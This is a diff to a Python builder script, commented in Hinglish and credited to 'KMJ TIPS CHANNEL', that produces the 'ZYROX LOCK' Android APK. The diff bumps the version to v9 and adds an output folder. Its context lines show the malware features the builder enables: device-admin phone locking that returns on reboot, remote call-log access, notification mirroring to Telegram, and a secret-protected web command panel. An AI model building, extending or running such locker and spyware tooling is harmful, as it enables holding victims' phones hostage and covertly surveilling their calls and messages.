@@ -20,6 +20,7 @@ from getpass import getpass
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 TEMPLATE = os.path.join(HERE, "template.apk")
+VERSION = "v9"  # builder version — har major update pe badhao
 
 C = {"R": "\033[0;31m", "G": "\033[0;32m", "Y": "\033[1;33m",
      "CY": "\033[0;36m", "M": "\033[0;35m", "B": "\033[1m", "N": "\033[0m"}
@@ -33,7 +34,7 @@ def banner():
     print("   / /  \\\\ V /| |_) \\\\  / | | \\\\  / ")
     print("  / /_   | | |  _ < / \\\\ |_| /  \\\\ ")
     print(" /____|  |_| |_| \\\\_/_/\\\\_\\\\___/_/\\\\_\\\\")
-    print(f"{C['Y']}{C['B']}      LOCK  BUILDER  v7{C['N']}")
+    print(f"{C['Y']}{C['B']}      LOCK  BUILDER  {VERSION}{C['N']}")
     print(f"{C['B']}   Made By KMJ TIPS CHANNEL{C['N']}\n")
 
 
@@ -207,7 +208,7 @@ def main():
         print(f"{C['Y']}⚠ 4 se chhota — panel lock skip.{C['N']}")
         panel_pw = ""
 
-    # STEP 13: call logs + notification mirror (v8)
+    # STEP 13: call logs + notification mirror (v9)
     print(f"\n{C['CY']}{C['B']}--- STEP 13: Call Logs + Notification Mirror ---\n{C['N']}")
     call_log = ask_yn("📞 Call log access (remote /calls command)", "y")
     notif_mirror = ask_yn("🔔 Notification mirror (phone notifications → Telegram)")
@@ -302,12 +303,26 @@ def main():
     except Exception as e:
         print(f"{C['Y']}⚠ index.html nahi ban paya: {e}{C['N']}")
 
+    # v9: output folder — APK + panel ek jagah, dhoondhna aasaan
+    outdir = os.path.join(os.getcwd(), f"ZYROX-LOCK-{VERSION}")
+    try:
+        os.makedirs(outdir, exist_ok=True)
+        shutil.copy2(out, os.path.join(outdir, "ZYROX-LOCK.apk"))
+        idx = os.path.join(os.getcwd(), "index.html")
+        if os.path.isfile(idx):
+            shutil.copy2(idx, os.path.join(outdir, "index.html"))
+        print(f"{C['G']}[✓]{C['N']} 📁 Output folder: {outdir}")
+        print(f"{C['G']}[✓]{C['N']} 📁 me copy hua: ZYROX-LOCK.apk + index.html")
+    except Exception as e:
+        print(f"{C['Y']}⚠ Folder copy nahi hua: {e} — APK yahin hai: {out}{C['N']}")
+
     print(f"\n{C['Y']}{C['B']}╔══════════════════════════════════════╗{C['N']}")
     print(f"{C['Y']}{C['B']}║  🔑 PANEL SECRET: {cmd_secret}          ║{C['N']}")
     print(f"{C['Y']}{C['B']}╚══════════════════════════════════════╝{C['N']}")
     print(f"{C['B']}   ⬆ Ye secret apne web panel me dalna — bina iske panel commands kaam nahi karenge!{C['N']}\n")
 
     print(f"{C['Y']}{C['B']}--- LAST STEPS (app me hi honge) ---\n{C['N']}"
+          f"📁 APK + panel is folder me hain: {C['B']}ZYROX-LOCK-{VERSION}/{C['N']}\n"
           f"1. {C['B']}MT Manager{C['N']} me ZYROX-LOCK.apk ko {C['B']}sign{C['N']} karo\n"
           "2. Install karo, kholo — app khud puchega:\n"
           f"   Step 1: {C['B']}🛡️ ENABLE ADMIN{C['N']} dabao → Activate karo\n"
@@ -317,7 +332,7 @@ def main():
           "3. 🔐 Offline/Online password me se koi ek dalo → phone unlock! ✅\n"
           "4. Reboot pe auto-lock lagega 🔒\n")
     print(f"{C['G']}{C['B']}======================================{C['N']}")
-    print(f"{C['G']}{C['B']}  ✅ ZYROX LOCK v8 APK READY!{C['N']}")
+    print(f"{C['G']}{C['B']}  ✅ ZYROX LOCK {VERSION} APK READY!{C['N']}")
     print(f"{C['G']}{C['B']}======================================{C['N']}")
     print(f"\n{C['B']}  Made By KMJ TIPS CHANNEL 💛{C['N']}\n")
 
